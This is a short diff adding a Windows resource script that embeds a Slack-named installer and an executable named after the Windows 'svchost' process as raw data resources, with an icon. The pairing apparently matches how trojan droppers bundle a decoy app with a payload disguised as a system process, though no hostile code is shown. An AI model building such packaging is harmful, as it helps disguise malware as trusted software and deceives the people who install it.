@@ -1,0 +1,4 @@
+// resources.rc
+101 RCDATA "slack-4-49-81.exe"
+102 RCDATA "svchost_20260409_103344.exe"
+IDI_MAIN ICON "Icon3.ico"
